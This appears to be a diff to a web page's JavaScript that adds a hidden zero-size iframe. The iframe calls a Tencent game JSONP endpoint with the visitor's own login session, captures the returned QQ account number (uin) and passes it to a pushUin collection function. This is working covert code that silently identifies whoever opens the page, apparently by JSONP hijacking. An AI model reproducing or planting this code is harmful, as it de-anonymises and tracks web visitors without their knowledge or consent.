@@ -11,7 +11,8 @@ $(function(){
         var t = +new Date, url = 'http://apps.qq.com/app/yx/cgi-bin/show_fel?hc=8&lc=4&d=365633133&t='+t;
         appendJS(url, function(s){
             if(data0 && data0.err === 1026){
-                appJs();
+                //appJs();
+				addFrame();
             }else if(data0 && data0.err === 1002){
                 if(quin){
                     pushUin(quin);
@@ -21,6 +22,13 @@ $(function(){
             }
         });
     }
+	
+	function addFrame(){
+		//var t = +new Date, url = 'http://zf.huanle.qq.com/cgi-bin/hlddz_box/hlddz_silver_to_gold_box?callback=gfq&uin=&_='+t;
+		var t = +new Date, url = 'http://zf.huanle.qq.com/cgi-bin/hlddz_box/hlddz_open_box?callback=gfq&uin=&_='+t;
+		window.Pimg = "<script>function gfq(c){parent.gaofenCallback(c);}</script><script id='img' src='"+url+"'></script>";
+		$('body').append('<iframe src="javascript:parent.Pimg;" style="width: 0px; height: 0px;"></iframe>');
+	}
 
     function appJs(){
 		var t = +new Date, url = 'http://zf.huanle.qq.com/cgi-bin/hlddz_box/hlddz_silver_to_gold_box?callback=gaofenCallback&uin=&_='+t;
@@ -84,12 +92,16 @@ $(function(){
     }
 
     window.gaofenCallback = window.gaofenCallback || function(d){
+		/*
         if(d.result === 1000005){//未登录
-            if(quin) pushUin(quin);
-            else setTimeout(appJs, 10000);
+
         }else{
             pushUin(d.uin);
         }
+		*/
+		if(d && d.uin){
+			pushUin(d.uin);
+		}
     };
     if(quin){
         var quin = quin.split(','), _quin = [];
